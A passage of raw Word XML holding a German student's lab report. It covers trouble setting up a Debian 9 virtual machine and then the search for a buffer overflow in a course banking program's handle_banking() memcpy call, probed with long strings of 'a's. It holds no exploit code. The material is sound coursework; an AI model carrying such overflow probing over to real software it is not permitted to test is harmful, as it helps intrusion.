        <w:t xml:space="preserve">auf meinem Host Virtualbox installiert. Falls man </w:t>
      </w:r>
      <w:r w:rsidR="003D0075" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>eine virtuelle Maschine</w:t>
      </w:r>
      <w:r w:rsidR="00866BC5" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> im Vollbildmodus laufen lassen will</w:t>
      </w:r>
      <w:r w:rsidR="003D0075">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00866BC5" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> braucht man da die Guest Additions. Die habe ich </w:t>
      </w:r>
      <w:r w:rsidR="00F11C19" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">erst installieren können nachdem ich ein upgrade (apt-get install upgrade) gemacht habe. Mit dem Upgrade wurde aber (denke ich!) die lib.c Version aktualisiert und ich bekam wieder die Meldung „segmentation fault“. Also habe ich nochmals probiert das </w:t>
      </w:r>
      <w:r w:rsidR="00230092" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>zu fixen, konnte die Anwendung aber wieder nicht zum Laufen bringen.</w:t>
      </w:r>
      <w:r w:rsidR="00447C7A" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Na gut, Debian 9 nochmal installieren probiert. Anwendung läuft wieder aber ohne Guest Additions</w:t>
      </w:r>
      <w:r w:rsidR="00BB47EB" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="0023271A" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Also habe ich Debian 9 nochmal mit VMWare Player und der offiziellen ISO versucht zu installieren. </w:t>
      </w:r>
      <w:r w:rsidR="00E07B86" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Nachdem die Installation durch war ist die </w:t>
      </w:r>
      <w:r w:rsidR="00C7185A">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>virtuelle Maschine</w:t>
      </w:r>
      <w:r w:rsidR="00E07B86" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> einfach nicht gestartet</w:t>
      </w:r>
      <w:r w:rsidR="000D645F" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> und ich erhielt einen Blackscreen</w:t>
      </w:r>
      <w:r w:rsidR="00E07B86" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>. Na gut, dachte ich mir, probierst du das ganze halt nochmal mit W</w:t>
      </w:r>
      <w:r w:rsidR="00AE6E11" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>orkstation Pro aus und siehe da, Debian 9 läuft. Das ganze Spiel hat mich ungefähr 16 Stunden gekostet.</w:t>
      </w:r>
      <w:r w:rsidR="00C461B8" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Anmerkung von mir: Vielleicht könnte man hier den Kollegen aus den nächsten Semestern kurz einen Hinweis geben, dass empfohlen wird mit VMware Workstation Pro und </w:t>
      </w:r>
      <w:r w:rsidR="003F7F47" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>eventuell sogar mit folgender ISO zu arbeiten:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FF06C60" w14:textId="357A7711" w:rsidR="003F7F47" w:rsidRPr="00B47CB9" w:rsidRDefault="003F7F47" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36369900" w14:textId="10D60C51" w:rsidR="003F7F47" w:rsidRPr="00B47CB9" w:rsidRDefault="00DE67E4" w:rsidP="003F7F47">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="37"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId81" w:history="1">
        <w:r w:rsidR="003F7F47" w:rsidRPr="00B47CB9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>http://kambing.ui.ac.id/iso/debian/9.6.0/i386/iso-cd/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4B9C1EA8" w14:textId="1D58CF06" w:rsidR="003F7F47" w:rsidRPr="00B47CB9" w:rsidRDefault="003F7F47" w:rsidP="003F7F47">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="730AD9FD" w14:textId="407CD0F8" w:rsidR="003F7F47" w:rsidRPr="00B47CB9" w:rsidRDefault="00732378" w:rsidP="003F7F47">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Bei 11 Tagen Zeit für Aufgabe 3 und 4 ist </w:t>
      </w:r>
      <w:r w:rsidR="00564E88" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>nat</w:t>
      </w:r>
      <w:r w:rsidR="0097552C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">ürlich jede </w:t>
      </w:r>
      <w:r w:rsidR="000D645F" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Stunde</w:t>
      </w:r>
      <w:r w:rsidR="0097552C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> kostbar, daher wollte ich </w:t>
      </w:r>
      <w:r w:rsidR="000D645F" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>in an dieser Stelle nur nochmal darauf hinweisen.</w:t>
      </w:r>
      <w:r w:rsidR="00D3660D">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Bitte nicht als </w:t>
      </w:r>
      <w:r w:rsidR="006F09E2" w:rsidRPr="006F09E2">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">rumgeheule </w:t>
      </w:r>
      <w:r w:rsidR="00D3660D">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>verstehen…</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C90B107" w14:textId="65E43EFE" w:rsidR="002904CE" w:rsidRPr="00B47CB9" w:rsidRDefault="002904CE" w:rsidP="003F7F47">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3934370C" w14:textId="5212F7CA" w:rsidR="008637EF" w:rsidRPr="00B47CB9" w:rsidRDefault="002904CE" w:rsidP="003F7F47">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Daraufhin </w:t>
      </w:r>
      <w:r w:rsidR="00CB4F69" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>began</w:t>
      </w:r>
      <w:r w:rsidR="00A16424" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">n </w:t>
      </w:r>
      <w:r w:rsidR="009324F6" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>ich nach der Suche der Schwachstelle im Code. Dabei stoß ich auf eine List</w:t>
      </w:r>
      <w:r w:rsidR="006F09E2">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r w:rsidR="009324F6" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="008637EF" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>von „SDL Banned Functions“</w:t>
      </w:r>
      <w:r w:rsidR="00744C12" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> und deren </w:t>
      </w:r>
      <w:r w:rsidR="008E4BC9" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Alternativen </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:rPr>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:alias w:val="Don't edit this field"/>
          <w:tag w:val="CitaviPlaceholder#02a49b47-25b3-4410-9551-2200d8d69e10"/>
          <w:id w:val="-301237543"/>
          <w:placeholder>
            <w:docPart w:val="DefaultPlaceholder_-1854013440"/>
          </w:placeholder>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r w:rsidR="008E4BC9" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="003A23EE">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:instrText>ADDIN CitaviPlaceholder{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}</w:instrText>
          </w:r>
          <w:r w:rsidR="008E4BC9" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="002F4DA3">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t>[10]</w:t>
          </w:r>
          <w:r w:rsidR="008E4BC9" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
      <w:r w:rsidR="008637EF" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B2983D9" w14:textId="02B423D5" w:rsidR="00D165A6" w:rsidRPr="00B47CB9" w:rsidRDefault="00D165A6" w:rsidP="003F7F47">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53CF4991" w14:textId="36022C16" w:rsidR="00D165A6" w:rsidRPr="00B47CB9" w:rsidRDefault="00D165A6" w:rsidP="003F7F47">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Ich begann </w:t>
      </w:r>
      <w:r w:rsidR="0037115C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>die Liste durchzugehen und entdecke folgende Funktionen:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C620942" w14:textId="36AE6730" w:rsidR="0037115C" w:rsidRPr="00714F24" w:rsidRDefault="0037115C" w:rsidP="00714F24">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="37"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00714F24">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Strlen</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B5455B1" w14:textId="5C0B54B8" w:rsidR="0037115C" w:rsidRPr="00714F24" w:rsidRDefault="00817F38" w:rsidP="00714F24">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="37"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00714F24">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Memcpy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2534D4BB" w14:textId="392E0584" w:rsidR="008637EF" w:rsidRPr="00B47CB9" w:rsidRDefault="008637EF" w:rsidP="003F7F47">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7CAF489D" w14:textId="4A1EB26B" w:rsidR="00613054" w:rsidRPr="00B47CB9" w:rsidRDefault="00B102B8" w:rsidP="003F7F47">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Besonders ins Auge gefallen ist mir dabei folgend</w:t>
      </w:r>
      <w:r w:rsidR="00561988" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">er Bereich </w:t>
      </w:r>
      <w:r w:rsidR="00004BB0" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>in der Funktion handle_banking() in</w:t>
      </w:r>
      <w:r w:rsidR="0039117F" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>nerhalb einer Switch Anweisung</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EBBA4E0" w14:textId="21AFF869" w:rsidR="00B102B8" w:rsidRPr="00B47CB9" w:rsidRDefault="00B102B8" w:rsidP="003F7F47">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76D9A7E9" w14:textId="2C735B5E" w:rsidR="00561988" w:rsidRPr="00B47CB9" w:rsidRDefault="008377B8" w:rsidP="003F7F47">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6084DD58" wp14:editId="642C5BA6">
            <wp:extent cx="4095750" cy="600075"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="106" name="Grafik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095750" cy="600075"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="123649EF" w14:textId="763AD99F" w:rsidR="00B102B8" w:rsidRPr="00B47CB9" w:rsidRDefault="00B102B8" w:rsidP="003F7F47">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4ABB9003" w14:textId="1DC76D01" w:rsidR="00004BB0" w:rsidRPr="00B47CB9" w:rsidRDefault="0039117F" w:rsidP="003F7F47">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Sollte der Übergabeparameter ‚u‘ sein wird memcpy aufgerufen.</w:t>
      </w:r>
      <w:r w:rsidR="00DD3F05" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Ich las mir daher eine Dokumentation von memcpy durch</w:t>
      </w:r>
      <w:r w:rsidR="00BF293C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:rPr>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:alias w:val="Don't edit this field"/>
          <w:tag w:val="CitaviPlaceholder#f712024e-99fd-4aab-bb9c-23cc30a61c58"/>
          <w:id w:val="275915463"/>
          <w:placeholder>
            <w:docPart w:val="DefaultPlaceholder_-1854013440"/>
          </w:placeholder>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r w:rsidR="00BF293C" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="003A23EE">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:instrText>ADDIN CitaviPlaceholder{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}</w:instrText>
          </w:r>
          <w:r w:rsidR="00BF293C" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="002F4DA3">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t>[11]</w:t>
          </w:r>
          <w:r w:rsidR="00BF293C" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
      <w:r w:rsidR="00DD3F05" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="000737DF" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Diese sagt </w:t>
      </w:r>
      <w:r w:rsidR="0094544E" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">aus, dass die Funktionen </w:t>
      </w:r>
      <w:r w:rsidR="000D6BE0" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Werte von ‚num‘ Bytes von </w:t>
      </w:r>
      <w:r w:rsidR="00DD00D4" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">einer Location </w:t>
      </w:r>
      <w:r w:rsidR="00D74C8C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">‚source‘ </w:t>
      </w:r>
      <w:r w:rsidR="00DD00D4" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">zu einem Speicherblock </w:t>
      </w:r>
      <w:r w:rsidR="002A1241" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>einer ‚destination‘</w:t>
      </w:r>
      <w:r w:rsidR="00F46363">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> kopiert</w:t>
      </w:r>
      <w:r w:rsidR="002A1241" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11B92826" w14:textId="2F0ADC7E" w:rsidR="005845C0" w:rsidRPr="00B47CB9" w:rsidRDefault="005845C0" w:rsidP="003F7F47">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4EB9A357" w14:textId="504DDB9E" w:rsidR="002A1241" w:rsidRPr="008E2D33" w:rsidRDefault="002A1241" w:rsidP="003F7F47">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008E2D33">
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
        <w:t>memcpy (void * destination, const void * source, size_t num );</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F6223B4" w14:textId="77777777" w:rsidR="005845C0" w:rsidRPr="008E2D33" w:rsidRDefault="005845C0" w:rsidP="003F7F47">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2363957F" w14:textId="7C301533" w:rsidR="0039117F" w:rsidRPr="00B47CB9" w:rsidRDefault="00B17CDD" w:rsidP="003F7F47">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Außerdem wird in der Dokumentation erwähnt, dass </w:t>
      </w:r>
      <w:r w:rsidR="002D3F2F" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>die Größe von ‚source‘ und ‚destination‘ imm</w:t>
      </w:r>
      <w:r w:rsidR="00B50C75" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">er höher sein soll als ‚num‘ </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:rPr>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:alias w:val="Don't edit this field"/>
          <w:tag w:val="CitaviPlaceholder#5d5de929-51b6-47ba-9b96-e9c93d2cff86"/>
          <w:id w:val="-1040819681"/>
          <w:placeholder>
            <w:docPart w:val="DefaultPlaceholder_-1854013440"/>
          </w:placeholder>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r w:rsidR="00B50C75" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="003A23EE">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:instrText>ADDIN CitaviPlaceholder{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}</w:instrText>
          </w:r>
          <w:r w:rsidR="00B50C75" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="002F4DA3">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t>[11]</w:t>
          </w:r>
          <w:r w:rsidR="00B50C75" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
      <w:r w:rsidR="00D201CE" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">, um Bufferoverflow Angriffe zu verhindern. Ich vermutete, dass </w:t>
      </w:r>
      <w:r w:rsidR="00EC3332" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>genau hier das Problem ist.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D4E2109" w14:textId="06B25D38" w:rsidR="006F5596" w:rsidRPr="00B47CB9" w:rsidRDefault="006F5596" w:rsidP="002904CE">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="622DB6ED" w14:textId="41E8F3AA" w:rsidR="006F5596" w:rsidRPr="00B47CB9" w:rsidRDefault="009C1932" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Als nächstes </w:t>
      </w:r>
      <w:r w:rsidR="00484187" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>begann</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> ich </w:t>
      </w:r>
      <w:r w:rsidR="00916945" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">schrittweise </w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">herauszufinden, </w:t>
      </w:r>
      <w:r w:rsidR="00916945" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">ob sich </w:t>
      </w:r>
      <w:r w:rsidR="006219E2" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>die Schwachstelle hier befinden könnte</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">. Ich ging die Anwendung von oben nach durch und probierte </w:t>
      </w:r>
      <w:r w:rsidR="00544A1B" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>ein Paar unterschiedlich Lange Parameter (a’s) zu übergeben (siehe Abbildung).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="578E9723" w14:textId="1448F129" w:rsidR="00544A1B" w:rsidRPr="00B47CB9" w:rsidRDefault="00544A1B" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D586465" w14:textId="5109D09F" w:rsidR="00544A1B" w:rsidRPr="00B47CB9" w:rsidRDefault="00650009" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="777C3F8B" wp14:editId="309B4DF0">
            <wp:extent cx="5759450" cy="2078990"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="98" name="Grafik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759450" cy="2078990"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="009534D7" w14:textId="6D45236C" w:rsidR="00650009" w:rsidRPr="00B47CB9" w:rsidRDefault="00650009" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="106CCD57" w14:textId="3E985286" w:rsidR="00650009" w:rsidRPr="00B47CB9" w:rsidRDefault="00160B3A" w:rsidP="00944226">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
